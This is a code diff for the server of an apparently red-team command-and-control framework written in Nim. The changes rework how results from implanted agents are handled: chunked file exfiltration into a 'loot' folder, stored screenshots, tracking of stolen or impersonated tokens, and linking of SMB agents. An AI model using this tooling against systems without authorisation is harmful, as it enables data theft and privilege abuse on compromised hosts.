@@ -101,107 +101,203 @@ proc handleResult*(resultData: seq[byte]) =
             cq.sendConsoleItem(agentId, LOG_INFO, fmt"{$resultData.len} bytes received.", silent)
             cq.info(fmt"{$resultData.len} bytes received.")
             
-            # Update task queue to include all tasks, except the one that was just completed
             case cast[StatusType](taskResult.status):
+            of STATUS_STARTED:
+                cq.sendConsoleItem(agentId, LOG_SUCCESS, fmt"Job started.", silent)
+                cq.success(fmt"Job {taskId} started.")
+
+                case cast[CommandType](taskResult.command):
+                of CMD_DOWNLOAD:
+                    var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
+                    let 
+                        fileName = unpacker.getDataWithLengthPrefix().replace("\\", "_").replace("/", "_").replace(":", "")
+                        totalSize = unpacker.getUint64()
+
+                    # Create loot directory for the agent
+                    createDir(cast[Path](fmt"{CONQUEST_ROOT}/data/loot/{agentId}"))
+                    let downloadPath = fmt"{CONQUEST_ROOT}/data/loot/{agentId}/{fileName}"
+
+                    cq.downloads[taskId] = Download(
+                        path: downloadPath,
+                        total: totalSize,
+                        written: 0,
+                        file: open(downloadPath & ".partial", fmWrite)  # Downloads are stored with a .partial extension until the full file is received
+                    )
+                
+                else:
+                    if taskResult.data.len() > 0:
+                        cq.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data), silent)
+
+            of STATUS_IN_PROGRESS:
+                case cast[CommandType](taskResult.command):
+                of CMD_DOWNLOAD:
+                    if cq.downloads.hasKey(taskId):
+                        var download = addr cq.downloads[taskId]
+                        if taskResult.data.len() > 0:
+                            discard download.file.writeBuffer(addr taskResult.data[0], taskResult.data.len())
+                            download.written += uint64(taskResult.data.len())
+
+                            let progress = (download.written.float / download.total.float * 100)
+                            cq.sendConsoleItem(agentId, LOG_INFO, fmt"Task {taskId} in progress: {progress:.2f}%", silent)
+                
+                else:
+                    if int(taskResult.length) > 0:
+                        cq.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data), silent)
+
+                return
+
             of STATUS_COMPLETED:
                 cq.sendConsoleItem(agentId, LOG_SUCCESS, fmt"Task {taskId} completed.", silent)
                 cq.success(fmt"Task {taskId} completed.")
+
+                # Remove completed task
                 cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)
 
-                # Handle additional actions or UI-events based on command type (only when command succeeded)
+                # Handle command specific actions on task completion (e.g. triggering UI changes, writing files, ...) 
                 case cast[CommandType](taskResult.command):
+                of CMD_DOWNLOAD:
+                    # Complete download job
+                    if cq.downloads.hasKey(taskId):
+                        var download = addr cq.downloads[taskId]
+                        if taskResult.data.len() > 0:
+                            discard download.file.writeBuffer(addr taskResult.data[0], taskResult.data.len())
+                            download.written += uint64(taskResult.data.len())
+                        download.file.close()
+
+                        moveFile(download.path & ".partial", download.path) # Remove .partial extension 
+
+                        let fileInfo = getFileInfo(download.path)
+                        var lootItem = LootItem(
+                            lootId: generateUuid(),
+                            itemType: DOWNLOAD,
+                            agentId: agentId, 
+                            path: download.path, 
+                            timestamp: fileInfo.creationTime.toUnix(),
+                            size: fileInfo.size, 
+                            host: cq.agents[agentId].hostname
+                        )
+                        discard cq.dbStoreLoot(lootItem)
+                        cq.sendLoot(lootItem)
+
+                        cq.output(fmt"File downloaded to {download.path} ({download.written} bytes).", "\n")
+                        cq.sendConsoleItem(agentId, LOG_OUTPUT, fmt"File downloaded to {download.path} ({download.written} bytes).", silent)
+                        
+                        # Remove completed download from in-memory table
+                        cq.downloads.del(taskId)
+
+                of CMD_SCREENSHOT:
+                    # Write screenshot data to disk
+                    var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
+                    let 
+                        fileName = unpacker.getDataWithLengthPrefix().replace("\\", "_").replace("/", "_").replace(":", "")
+                        fileData = unpacker.getDataWithLengthPrefix()
+
+                    createDir(cast[Path](fmt"{CONQUEST_ROOT}/data/loot/{agentId}"))
+                    let downloadPath = fmt"{CONQUEST_ROOT}/data/loot/{agentId}/{fileName}"
+                    writeFile(downloadPath, fileData)
+
+                    let fileInfo = getFileInfo(downloadPath)
+                    var lootItem = LootItem(
+                        lootId: generateUuid(),
+                        itemType: SCREENSHOT,
+                        agentId: agentId, 
+                        path: downloadPath, 
+                        timestamp: fileInfo.creationTime.toUnix(),
+                        size: fileInfo.size, 
+                        host: cq.agents[agentId].hostname
+                    )
+                    discard cq.dbStoreLoot(lootItem)
+                    cq.sendLoot(lootItem)
+
+                    cq.output(fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).", "\n")
+                    cq.sendConsoleItem(agentId, LOG_OUTPUT, fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).", silent)
+
                 of CMD_MAKE_TOKEN, CMD_STEAL_TOKEN: 
-                    let impersonationToken: string = Bytes.toString(taskResult.data).split(" ", 1)[1..^1].join(" ")[0..^2]   # Remove trailing '.' character from the domain\username string
+                    # Display token impersonation in UI
+                    let impersonationToken: string = Bytes.toString(taskResult.data).split(" ", 1)[1..^1].join(" ")[0..^2]
                     if cq.dbUpdateTokenImpersonation(agentId, impersonationToken):
                         cq.agents[agentId].impersonationToken = impersonationToken
                         cq.sendImpersonateToken(agentId, impersonationToken) 
+                
                 of CMD_REV2SELF:
+                    # Remove token impersonation
                     if cq.dbUpdateTokenImpersonation(agentId, ""):
                         cq.agents[agentId].impersonationToken.setLen(0)
                         cq.sendRevertToken(agentId)
+                
                 of CMD_CD, CMD_PWD: 
+                    # Update working directory in the client UI
                     cq.sendWorkingDirectory(agentId, Bytes.toString(taskResult.data))
 
-                else: discard
+                of CMD_LINK: 
+                    # When an SMB agent is linked, the registration data is sent as the task result of the 'link' command
+                    # We register the newly linked agent as a child of the requesting agent
+                    var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
+                    discard unpacker.getUint8()
+                    let registrationBytes = string.toBytes(unpacker.getDataWithLengthPrefix())
+                    
+                    let agent = cq.deserializeNewAgent(registrationBytes, "")
+                    cq.agents[agentId].links.add(agent.agentId)
+                    if not cq.dbStoreLink(agentId, agent.agentId):
+                        raise newException(CatchableError, "Failed to store link in database.")
+                    
+                    discard register(registrationBytes, cq.agents[agentId].ipExternal)
+
+                of CMD_UNLINK: 
+                    # Remove the link between two agents
+                    let linkedAgentId = Bytes.toString(taskResult.data).toUpperAscii()
+                    cq.agents[agentId].links.keepItIf(it != linkedAgentId)
+                    if not cq.dbDeleteLink(agentId, linkedAgentId):
+                        raise newException(CatchableError, "Failed to delete link from database.")
+
+                of CMD_PS:
+                    # Send process list to the client
+                    cq.sendProcessList(agentId, Bytes.toString(taskResult.data), silent)
+
+                of CMD_LS:
+                    # Send directory listing data to the client
+                    cq.sendDirectoryListing(agentId, Bytes.toString(taskResult.data), silent)
+
+                of CMD_JOBS:
+                    # Send list of pending job to the client 
+                    cq.sendJobs(agentId, Bytes.toString(taskResult.data), silent)
+                    discard
+
+                else: discard 
+                
+                # Output RESULT_STRING packets to the agent console
+                if cast[ResultType](taskResult.resultType) == RESULT_STRING and int(taskResult.length) > 0:
+                    cq.sendConsoleItem(agentId, LOG_INFO, "Output:", silent) 
+                    cq.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data), silent)
 
             of STATUS_FAILED: 
                 cq.sendConsoleItem(agentId, LOG_ERROR, fmt"Task {taskId} failed.", silent)
                 cq.error(fmt"Task {taskId} failed.")
-                cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)
-            of STATUS_IN_PROGRESS: 
-                discard
 
-            case cast[ResultType](taskResult.resultType):
-            of RESULT_STRING:
+                # Remove failed task
+                cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)
+
                 if int(taskResult.length) > 0:
-                    cq.sendConsoleItem(agentId, LOG_INFO, "Output:", silent) 
                     cq.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data), silent)
 
-            of RESULT_BINARY:
-                # Write binary data to a file 
-                # A binary result packet consists of the filename and file contents, both prefixed with their respective lengths as a uint32 value
-                var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
-                let 
-                    fileName = unpacker.getDataWithLengthPrefix().replace("\\", "_").replace("/", "_").replace(":", "") # Replace path characters for better storage of downloaded files            
-                    fileData = unpacker.getDataWithLengthPrefix()
+            of STATUS_CANCELLED:
+                cq.sendConsoleItem(agentId, LOG_WARNING, fmt"Job {taskId} cancelled.", silent)
+                cq.info(fmt"Job {taskId} cancelled.")
 
-                # Create loot directory for the agent
-                createDir(cast[Path](fmt"{CONQUEST_ROOT}/data/loot/{agentId}"))
-                let downloadPath = fmt"{CONQUEST_ROOT}/data/loot/{agentId}/{fileName}"
+                # Remove cancelled task
+                cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)
 
-                writeFile(downloadPath, fileData)
+                case cast[CommandType](taskResult.command):
+                of CMD_DOWNLOAD:
+                    if cq.downloads.hasKey(taskId):
+                        cq.downloads[taskId].file.close()
+                        removeFile(cq.downloads[taskId].path & ".partial")
+                        cq.downloads.del(taskId)
+                else: discard
 
-                # Get file information
-                let fileInfo = getFileInfo(downloadPath)
-                var lootItem = LootItem(
-                    lootId: generateUuid(),
-                    itemType: parseEnum[LootItemType](($cast[CommandType](taskResult.command)).toUpperAscii()), # CMD_DOWNLOAD -> DOWNLOAD, CMD_SCREENSHOT -> SCREENSHOT
-                    agentId: agentId, 
-                    path: downloadPath, 
-                    timestamp: fileInfo.creationTime.toUnix(),
-                    size: fileInfo.size, 
-                    host: cq.agents[agentId].hostname
-                )
-
-                # Send loot to client to display file/screenshot in the UI
-                discard cq.dbStoreLoot(lootItem)
-                cq.sendLoot(lootItem)
-
-                cq.output(fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).", "\n")
-                cq.sendConsoleItem(agentId, LOG_OUTPUT, fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).", silent)
+            else: discard
             
-            of RESULT_PROCESSES: 
-                cq.sendProcessList(agentId, Bytes.toString(taskResult.data), silent)
-
-            of RESULT_DIRECTORY_LISTING: 
-                cq.sendDirectoryListing(agentId, Bytes.toString(taskResult.data), silent)
-
-            of RESULT_LINK: 
-                # When an SMB agent is linked, the registration data is sent as the task result of the 'link' command
-                # We register the newly linked agent
-                var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
-                discard unpacker.getUint8()
-                let registrationBytes = string.toBytes(unpacker.getDataWithLengthPrefix())
-                
-                # Store the link between the agents
-                let agent = cq.deserializeNewAgent(registrationBytes, "")
-                cq.agents[agentId].links.add(agent.agentId)
-                if not cq.dbStoreLink(agentId, agent.agentId):
-                    raise newException(CatchableError, "Failed to store link in database.")
-
-                discard register(registrationBytes, cq.agents[agentId].ipExternal)
-
-            of RESULT_UNLINK: 
-                # Remove the link between the agents
-                let linkedAgentId = Bytes.toString(taskResult.data).toUpperAscii()
-                cq.agents[agentId].links.keepItIf(it != linkedAgentId)
-                if not cq.dbDeleteLink(agentId, linkedAgentId):
-                    raise newException(CatchableError, "Failed to delete link from database.")
-
-            else: discard 
-
-            # Send newline to separate commands
             cq.sendConsoleItem(agentId, LOG_OUTPUT, "", silent)
-            
+
         except CatchableError as err:
-            cq.error(err.msg, "\n")  
+            cq.error(err.msg, "\n")
